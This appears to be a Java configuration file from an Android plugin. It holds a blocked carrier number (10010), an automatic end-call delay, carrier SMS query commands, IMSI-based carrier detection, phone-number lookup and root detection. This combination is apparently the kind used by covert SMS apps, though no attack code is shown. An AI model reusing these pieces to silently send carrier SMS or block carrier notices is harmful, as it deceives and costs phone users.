package com.xstd.plugin.config;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;

import java.io.File;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM9:43
 * To change this template use File | Settings | File Templates.
 */
public class AppRuntime {

    public static String BLOCKED_NUMBER_WITH_PREFIX = "10010";

    public static final int END_CALL_DELAY = 5000;

    public static final boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    /**
     * 向运营商发送的查询短信指令，从返回的指令中获取到短信中心的号码
     */
    public static final class SMSCenterCommand {
        public static final String CMNET_CMD = "0000";

        public static final String UNICOM_CMD1 = "102";
        public static final String UNICOM_CMD2 = "YE";
        public static final String UNICOM_CMD3 = "YECX";
        public static final String UNICOM_CMD4 = "CXHF";
    }

    public static final int CMNET = 1;
    public static final int UNICOM = 2;
    public static final int TELECOM = 3;
    public static final int SUBWAY = 4;

    public static int getNetworkTypeByIMSI(Context context) {
        String imsi = UtilsRuntime.getIMSI(context);
        if (!TextUtils.isEmpty(imsi) && imsi.length() > 6) {
            String mnc = imsi.substring(3, 5);
            if ("00".equals(mnc) || "02".equals(mnc) || "07".equals(mnc)) {
                return 1;
            } else if ("01".equals(mnc) || "06".equals(mnc)) {
                return 2;
            } else if ("03".equals(mnc) || "05".equals(mnc)) {
                return 3;
            } else if ("20".equals(mnc)) {
                return 4;
            }
        }

        return -1;
    }

    public static String getPhoneNumber(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            return tm.getLine1Number();
        }

        return null;
    }

    private final static int kSystemRootStateUnknow = -1;
    private final static int kSystemRootStateDisable = 0;
    private final static int kSystemRootStateEnable = 1;
    private static int systemRootState = kSystemRootStateUnknow;

    public static boolean isRootSystem() {
        if (systemRootState == kSystemRootStateEnable) {
            return true;
        } else if (systemRootState == kSystemRootStateDisable) {
            return false;
        }
        File f = null;
        final String kSuSearchPaths[] = {"/system/bin/", "/system/xbin/", "/system/sbin/", "/sbin/", "/vendor/bin/"};
        try {
            for (int i = 0; i < kSuSearchPaths.length; i++) {
                f = new File(kSuSearchPaths[i] + "su");
                if (f != null && f.exists()) {
                    systemRootState = kSystemRootStateEnable;
                    return true;
                }
            }
        } catch (Exception e) {
        }

        systemRootState = kSystemRootStateDisable;
        return false;
    }

}
